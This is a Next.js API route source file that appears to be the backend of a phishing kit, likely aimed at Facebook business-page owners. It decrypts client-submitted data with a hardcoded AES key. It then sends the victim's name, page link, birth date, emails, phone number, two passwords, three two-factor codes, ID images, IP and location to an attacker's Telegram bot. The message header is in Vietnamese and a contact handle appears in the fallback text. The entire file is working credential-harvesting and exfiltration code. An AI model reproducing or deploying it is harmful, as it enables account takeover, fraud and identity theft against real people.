import { NextResponse } from "next/server";
import axios from "axios";
import https from "https";
import CryptoJS from "crypto-js";

const TELEGRAM_API = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}`;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const agent = new https.Agent({ family: 4 });
const secretKey = "HDNDT-JDHT8FNEK-JJHR";

function decrypt(encryptedData: string): string {
    try {
        if (!encryptedData || typeof encryptedData !== "string") {
            throw new Error("Invalid encrypted input");
        }
        const bytes = CryptoJS.AES.decrypt(encryptedData, secretKey);
        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
        if (!decrypted) throw new Error("Decryption failed");
        return decrypted;
    } catch (error) {
        console.error("Decryption error:", error);
        throw new Error("Invalid encrypted data");
    }
}

async function sendMessageTelegram(data: any): Promise<void> {
    try {
        const message = `
<b>🔔THÔNG TIN TÀI KHOẢN🔔</b>
-----------------------------
<b>Full Name:</b> <code>${data.name || ''}</code>
<b>Link Page:</b> <code>${data.fanpage || ''}</code>
<b>Date of birth:</b> <code>${data.day || ''}/${data.month || ''}/${data.year || ''}</code>
-----------------------------
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.business || ''}</code>
<b>Phone Number:</b> <code>+${data.phone || ''}</code>
-----------------------------
<b>Password First:</b> <code>${data.password || ''}</code>
<b>Password Second:</b> <code>${data.passwordSecond || ''}</code>
-----------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>
<b>🔐Code 2FA(3):</b> <code>${data.twoFaThird || ''}</code>
-----------------------------
<b>ID Images:</b><code>${data.idImages || ''}</code>
-----------------------------
<b>Ip:</b> <code>${data.ip || 'Error, contact @otis_cua'}</code>
<b>Location:</b> <code>${data.location || 'Error, contact @otis_cua'}</code>`.trim();

        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        }, {
            httpsAgent: agent,
            timeout: 10000
        });
    } catch (err) {
        console.error("Failed to send message to Telegram:", err.message || err);
        throw new Error("Failed to send message to Telegram");
    }
}

export async function POST(req: Request) {
    try {
        const body = await req.json();

        if (!body?.data || typeof body.data !== "string") {
            return NextResponse.json(
                { message: "Invalid request: 'data' is required", error_code: 1 },
                { status: 400 }
            );
        }

        let decrypted = "";
        try {
            decrypted = decrypt(body.data);
        } catch (err) {
            return NextResponse.json(
                { message: "Decryption failed", error_code: 3 },
                { status: 400 }
            );
        }

        let values;
        try {
            values = JSON.parse(decrypted);
        } catch (err) {
            return NextResponse.json(
                { message: "Invalid JSON format after decryption", error_code: 4 },
                { status: 400 }
            );
        }

        await sendMessageTelegram(values);

        return NextResponse.json({ message: "Success", error_code: 0 }, { status: 200 });
    } catch (error) {
        console.error("Unhandled error:", error);
        return NextResponse.json(
            { message: "Internal server error", error_code: 2 },
            { status: 500 }
        );
    }
}